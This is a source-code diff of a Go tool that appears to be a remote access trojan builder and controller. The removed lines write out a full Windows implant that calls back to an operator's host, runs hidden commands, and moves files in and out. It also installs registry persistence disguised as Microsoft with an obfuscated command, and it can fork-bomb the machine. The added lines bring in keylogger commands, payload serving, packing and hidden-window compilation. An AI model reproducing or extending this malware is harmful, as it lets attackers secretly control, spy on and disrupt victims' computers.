@@ -14,6 +14,7 @@ import (
 	"os/exec"
 	"runtime"
 	"time"
+	"bytes"
 )
 
 const (
@@ -24,7 +25,7 @@ const (
 	BLUE    = "\x1b[34;1m"
 	MAGENTA = "\x1b[35;1m"
 	CYAN    = "\x1b[36;1m"
-	VERSION = "1.0.3"
+	VERSION = "2.0.0"
 )
 
 func main() {
@@ -117,6 +118,35 @@ func Encrypt(Key []byte, PlainCode []byte) string {
 	return base64.URLEncoding.EncodeToString(CipherCode)
 }
 
+func getDateTime() string{
+  currentTime := time.Now()
+  // https://golang.org/pkg/time/#example_Time_Format
+  return currentTime.Format("2006-01-02-15-04-05")
+}
+
+func TemplateTextReplace(ParamOne string, ParamTwo string, ParamThree string, ParamFour string, ParamFive string){
+  input, err := ioutil.ReadFile("Template_CHAOS.go")
+
+  if err != nil {
+    fmt.Println(RED, "[!] Error to replace template!")
+		os.Exit(1)
+  }
+
+  output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
+  output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
+  output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
+  output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)
+
+  if err = ioutil.WriteFile(ParamFive + ".go", output, 0666); err != nil {
+		fmt.Println(RED, "[!] Error to write template!")
+		os.Exit(1)
+  }
+}
+
+func ServeFiles(){
+	go exec.Command("sh", "-c", "xterm -e \"go run Serve.go\"").Output()
+}
+
 func ShowName() {
 	fmt.Println("")
 	fmt.Println(RED, "▄████████    ▄█    █▄       ▄████████  ▄██████▄     ▄████████  ")
@@ -138,7 +168,8 @@ func ShowMenu() {
 	fmt.Println("")
 	fmt.Println(YELLOW, " [1] Generate")
 	fmt.Println(YELLOW, " [2] Listen")
-	fmt.Println(YELLOW, " [3] Quit")
+	fmt.Println(YELLOW, " [3] Serve")
+	fmt.Println(YELLOW, " [4] Quit")
 	fmt.Println("")
 	fmt.Print(WHITE, " Choose a Option: ")
 	OPT := ReadLine()
@@ -149,6 +180,10 @@ func ShowMenu() {
 	case "2":
 		RunServer()
 	case "3":
+		ServeFiles()
+		ClearScreen()
+		ShowMenu()
+	case "4":
 		ClearScreen()
 		os.Exit(0)
 	}
@@ -197,184 +232,14 @@ func GenerateCode() {
 	}
 
 	pathPersistence := GeneratePath(8)
-	genCode, _ := os.Create(string(NAME) + ".go")
-	genCode.WriteString("package main\r\n")
-	genCode.WriteString("import (\r\n")
-	genCode.WriteString("\"net\"\r\n")
-	genCode.WriteString("\"fmt\"\r\n")
-	genCode.WriteString("\"bufio\"\r\n")
-	genCode.WriteString("\"os\"\r\n")
-	genCode.WriteString("\"os/exec\"\r\n")
-	genCode.WriteString("\"encoding/base64\"\r\n")
-	genCode.WriteString("\"io/ioutil\"\r\n")
-	genCode.WriteString("\"syscall\"\r\n")
-	genCode.WriteString("\"time\"\r\n")
-	genCode.WriteString(")\r\n")
-	genCode.WriteString("const IP = \"" + string(LHOST) + ":" + string(LPORT) + "\"\r\n")
-	genCode.WriteString("const fileName = \"" + NAME + ".exe\"\r\n")
-	genCode.WriteString("const folderPath = \"\\\\ProgramData\"\r\n")
-	genCode.WriteString("const folderExt = \"\\\\" + string(pathPersistence) + "\"\r\n")
-	genCode.WriteString("func main() {\r\n")
-	genCode.WriteString("WaitTimeMenu()\r\n")
-	genCode.WriteString("for{\r\n")
-	genCode.WriteString("connect()\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("func WaitTimeMenu(){\r\n")
-	genCode.WriteString("go func() {\r\n")
-	genCode.WriteString("time.Sleep(time.Second * 30)\r\n")
-	genCode.WriteString("}()\r\n")
-	genCode.WriteString("select {\r\n")
-	genCode.WriteString("case <-time.After(time.Second * 30):\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("func connect(){\r\n")
-	genCode.WriteString("conn, err := net.Dial(\"tcp\", IP)\r\n")
-	genCode.WriteString("if err != nil {\r\n")
-	genCode.WriteString("fmt.Println(\"Connecting...\")\r\n")
-	genCode.WriteString("for{\r\n")
-	genCode.WriteString("connect()\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("for{\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("decodedCase, _ := base64.StdEncoding.DecodeString(command)\r\n")
-	genCode.WriteString("fmt.Print(string(decodedCase))\r\n")
-	genCode.WriteString("switch string(decodedCase) {\r\n")
-	genCode.WriteString("case \"back\":\r\n")
-	genCode.WriteString("conn.Close()\r\n")
-	genCode.WriteString("connect()\r\n")
-	genCode.WriteString("case \"exit\":\r\n")
-	genCode.WriteString("conn.Close()\r\n")
-	genCode.WriteString("os.Exit(0)\r\n")
-	genCode.WriteString("case \"download\":\r\n")
-	genCode.WriteString("download, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("decodeDownload, _ := base64.StdEncoding.DecodeString(download)\r\n")
-	genCode.WriteString("file, err := ioutil.ReadFile(string(decodeDownload))\r\n")
-	genCode.WriteString("if err != nil {\r\n")
-	genCode.WriteString("conn.Write([]byte(\"[!] File not found!\" + \"\\n\"))\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("encData := base64.URLEncoding.EncodeToString(file)\r\n")
-	genCode.WriteString("conn.Write([]byte(string(encData) + \"\\n\"))\r\n")
-	genCode.WriteString("fmt.Println(encData)\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"upload\":\r\n")
-	genCode.WriteString("uploadOutput, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)\r\n")
-	genCode.WriteString("encData, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("decData, _ := base64.URLEncoding.DecodeString(encData)\r\n")
-	genCode.WriteString("ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)\r\n")
-	genCode.WriteString("case \"getos\":\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"wmic os get name\")\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
-	genCode.WriteString("c, _ := cmd.Output()\r\n")
-	genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
-	genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"lockscreen\":\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"rundll32.exe user32.dll,LockWorkStation\")\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
-	genCode.WriteString("c, _ := cmd.Output()\r\n")
-	genCode.WriteString("fmt.Println(string(c))\r\n")
-	genCode.WriteString("encoded := base64.StdEncoding.EncodeToString([]byte(\"-> Locked!\"))\r\n")
-	genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"ls\":\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"dir\")\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
-	genCode.WriteString("c, _ := cmd.Output()\r\n")
-	genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
-	genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"persistence enable\":\r\n")
-	genCode.WriteString("os.MkdirAll(os.Getenv(\"systemdrive\") + folderPath + folderExt, 0777)\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"xcopy /Y \" + fileName + \" \" + os.Getenv(\"systemdrive\") + folderPath + folderExt)\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
-	genCode.WriteString("c, _ := cmd.Output()\r\n")
-	genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
-	genCode.WriteString("fmt.Println(encoded)\r\n")
-	decodedCommand, _ := base64.StdEncoding.DecodeString("c3RhcnR1cFJlZyA6PSAiUkVHIEFERCBIS0NVXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIC9WIFwiTWljcm9zb2Z0IENvcnBvcmF0aW9uXCIgL3QgUkVHX1NaIC9GIC9EICIgKyAiXCIiICsgIiVzeXN0ZW1kcml2ZSUiICsgZm9sZGVyUGF0aCArIGZvbGRlckV4dCArICJcXCIgKyBmaWxlTmFtZSArICJcIiI=")
-	// startupReg := "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Microsoft Corporation\" /t REG_SZ /F /D " + "\"" + "%systemdrive%" + folderPath + folderExt + "\\" + fileName + "\""
-	genCode.WriteString(string(decodedCommand) + "\r\n")
-	genCode.WriteString("batReg, _ := os.Create(os.Getenv(\"systemdrive\") + folderPath + folderExt +  \"\\\\reg.bat\")\r\n")
-	genCode.WriteString("batReg.WriteString(string(startupReg))\r\n")
-	genCode.WriteString("batReg.Close()\r\n")
-	genCode.WriteString("execBatReg := exec.Command(\"cmd\", \"/C\", os.Getenv(\"systemdrive\") + folderPath + folderExt + \"\\\\reg.bat\");\r\n")
-	genCode.WriteString("execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
-	genCode.WriteString("execBatReg.Run();\r\n")
-	genCode.WriteString("statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte(\"[*] Persistence Enabled!\"))\r\n")
-	genCode.WriteString("statusPersistenceFailed := base64.StdEncoding.EncodeToString([]byte(\"[!] Persistence Failed!\"))\r\n")
-	genCode.WriteString("file := os.Getenv(\"systemdrive\") + folderPath + folderExt + \"\\\\\" + fileName\r\n")
-	genCode.WriteString("_, err := os.Stat(file)\r\n")
-	genCode.WriteString("if err == nil {\r\n")
-	genCode.WriteString("conn.Write([]byte(statusPersistenceSuccess + \"\\n\"))\r\n")
-	genCode.WriteString("} else if os.IsNotExist(err) {\r\n")
-	genCode.WriteString("for{\r\n")
-	genCode.WriteString("conn.Write([]byte(statusPersistenceFailed + \"\\n\"))\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"persistence disable\":\r\n")
-	genCode.WriteString("os.RemoveAll(os.Getenv(\"systemdrive\") + folderPath + folderExt)\r\n")
-	genCode.WriteString("startupReg := \"REG DELETE HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /V \\\"Microsoft Corporation\\\" /F\"\r\n")
-	genCode.WriteString("fmt.Println(startupReg)\r\n")
-	genCode.WriteString("batReg, _ := os.Create(os.Getenv(\"systemdrive\") + folderPath + \"\\\\reg.bat\")\r\n")
-	genCode.WriteString("batReg.WriteString(string(startupReg))\r\n")
-	genCode.WriteString("batReg.Close()\r\n")
-	genCode.WriteString("execBatReg := exec.Command(\"cmd\", \"/C\", os.Getenv(\"systemdrive\") + folderPath + \"\\\\reg.bat\");\r\n")
-	genCode.WriteString("execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
-	genCode.WriteString("execBatReg.Run();\r\n")
-	genCode.WriteString("statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte(\"[*] Persistence Disabled!\"))\r\n")
-	genCode.WriteString("conn.Write([]byte(statusPersistenceSuccess + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"bomb\":\r\n")
-	genCode.WriteString("forkBombCommand := \"%0|%0\"\r\n")
-	genCode.WriteString("forkBomb, _ := os.Create(os.Getenv(\"systemdrive\") + folderPath + \"\\\\bomb.bat\")\r\n")
-	genCode.WriteString("forkBomb.WriteString(string(forkBombCommand))\r\n")
-	genCode.WriteString("forkBomb.Close()\r\n")
-	genCode.WriteString("execForkBomb := exec.Command(\"cmd\", \"/C\", os.Getenv(\"systemdrive\") + folderPath + \"\\\\bomb.bat && del \" + os.Getenv(\"systemdrive\") + folderPath + \"\\\\bomb.bat\");\r\n")
-	genCode.WriteString("execForkBomb.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
-	genCode.WriteString("execForkBomb.Run();\r\n")
-	genCode.WriteString("statusMessageForkBomb := base64.StdEncoding.EncodeToString([]byte(\"[*] Executed Fork Bomb!\"))\r\n")
-	genCode.WriteString("conn.Write([]byte(statusMessageForkBomb + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("case \"openurl\":\r\n")
-	genCode.WriteString("url, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("decodeUrl, _ := base64.StdEncoding.DecodeString(url)\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"start \" + string(decodeUrl));\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
-	genCode.WriteString("cmd.Run();\r\n")
-	genCode.WriteString("status := base64.StdEncoding.EncodeToString([]byte(\"[*] Opened!\"))\r\n")
-	genCode.WriteString("conn.Write([]byte(status + \"\\n\"))\r\n")
-	genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
-	genCode.WriteString("fmt.Println(command)\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", command)\r\n")
-	genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
-	genCode.WriteString("c, _ := cmd.Output()\r\n")
-	genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
-	genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
-	genCode.WriteString("_, err := conn.Read(make([]byte, 0))\r\n")
-	genCode.WriteString("if err != nil{\r\n")
-	genCode.WriteString("connect()\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.WriteString("}\r\n")
-	genCode.Close()
+
+	TemplateTextReplace(string(LHOST), string(LPORT), string(NAME + ".exe"), string(pathPersistence), string(NAME))
 
 	fmt.Println("")
 	fmt.Println(GREEN, "[*] Compiling...")
 	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME)+".go").Output()
 
-	fmt.Println(GREEN, "[*] Generated \""+string(NAME)+".exe\"")
+	fmt.Println(GREEN, "[*] Generated \"" + string(NAME) + ".exe\"")
 	fmt.Println("")
 
 	fmt.Print(YELLOW, "Compress the payload with UPX? (y/N): ", WHITE)
@@ -383,7 +248,7 @@ func GenerateCode() {
 		UPX = "n"
 	}
 	if UPX == "y" || UPX == "Y" {
-		UPXOUT, _ := exec.Command("sh", "-c", "upx --force "+string(NAME)+".exe").Output()
+		UPXOUT, _ := exec.Command("sh", "-c", "upx --force " + string(NAME) + ".exe").Output()
 		fmt.Println("")
 		fmt.Println(string(UPXOUT))
 		WaitTime(5)
@@ -393,6 +258,18 @@ func GenerateCode() {
 		fmt.Println(RED, "[!] Invalid Option!")
 		WaitTime(2)
 	}
+
+	fmt.Println("")
+	fmt.Print(YELLOW, "Start Serve Files Now? (Y/n): ", WHITE)
+	SERVE := ReadLine()
+	if SERVE == "y" || SERVE == "Y" {
+		ServeFiles()
+	} else if SERVE == "n" || SERVE == "N" {
+		fmt.Println(WHITE, "[!] Not Serve!")
+	} else {
+		ServeFiles()
+	}
+
 	fmt.Println("")
 	fmt.Print(YELLOW, "Start Listener Now? (Y/n): ", WHITE)
 	LISTENER := ReadLine()
@@ -440,13 +317,15 @@ func RunServer() {
 			fmt.Println(CYAN, "-------------------------------------------------------")
 			fmt.Println(CYAN, "download            - File Download")
 			fmt.Println(CYAN, "upload              - File Upload")
+			fmt.Println(CYAN, "keylogger start     - Start Keylogger session")
+			fmt.Println(CYAN, "keylogger show      - Show Keylogger session logs")
 			fmt.Println(CYAN, "persistence enable  - Install at Startup")
 			fmt.Println(CYAN, "persistence disable - Remove from Startup")
 			fmt.Println(CYAN, "getos               - Get Operating System Name")
 			fmt.Println(CYAN, "lockscreen          - Lock the Screen")
 			fmt.Println(CYAN, "openurl             - Open the URL Informed")
 			fmt.Println(CYAN, "bomb                - Run Fork Bomb")
-			fmt.Println(CYAN, "clear               - Clear the Screen")
+			fmt.Println(CYAN, "clear or cls        - Clear the Screen")
 			fmt.Println(CYAN, "back                - Close Connection but Keep Running")
 			fmt.Println(CYAN, "exit                - Close Connection and exit")
 			fmt.Println(CYAN, "help                - Show this Help")
@@ -454,6 +333,9 @@ func RunServer() {
 			fmt.Println("")
 
 		case "clear":
+			ClearScreen()
+
+		case "cls":
 			ClearScreen()
 
 		case "back":
@@ -466,6 +348,20 @@ func RunServer() {
 			encExit := base64.URLEncoding.EncodeToString([]byte("exit"))
 			conn.Write([]byte(encExit + "\n"))
 			os.Exit(0)
+
+		case "keylogger start":
+			klgListen := base64.URLEncoding.EncodeToString([]byte("keylogger start"))
+			conn.Write([]byte(klgListen + "\n"))
+			message, _ := bufio.NewReader(conn).ReadString('\n')
+			decoded, _ := base64.StdEncoding.DecodeString(message)
+			fmt.Print(YELLOW, string(decoded) + "\n")
+
+		case "keylogger show":
+			klgShow := base64.URLEncoding.EncodeToString([]byte("keylogger show"))
+			conn.Write([]byte(klgShow + "\n"))
+			message, _ := bufio.NewReader(conn).ReadString('\n')
+			decoded, _ := base64.StdEncoding.DecodeString(message)
+			fmt.Print(string(decoded) + "\n")
 
 		case "download":
 			encDownload := base64.URLEncoding.EncodeToString([]byte("download"))
@@ -481,9 +377,9 @@ func RunServer() {
 
 			encData, _ := bufio.NewReader(conn).ReadString('\n')
 
-			fmt.Println("-> Downloading...")
+			fmt.Println(YELLOW, "-> Downloading...")
 			decData, _ := base64.URLEncoding.DecodeString(encData)
-			ioutil.WriteFile(string(outputName), []byte(decData), 777)
+			ioutil.WriteFile(string(outputName) + getDateTime(), []byte(decData), 777)
 
 		case "upload":
 			encUpload := base64.URLEncoding.EncodeToString([]byte("upload"))
@@ -495,9 +391,9 @@ func RunServer() {
 			fmt.Print("Output name: ")
 			outputName := ReadLine()
 			encOutput := base64.URLEncoding.EncodeToString([]byte(outputName))
-			conn.Write([]byte(encOutput + "\n"))
+			conn.Write([]byte(encOutput + getDateTime() + "\n"))
 
-			fmt.Println("-> Uploading...")
+			fmt.Println(YELLOW, "-> Uploading...")
 
 			file, err := ioutil.ReadFile(pathUpload)
 			if err != nil {
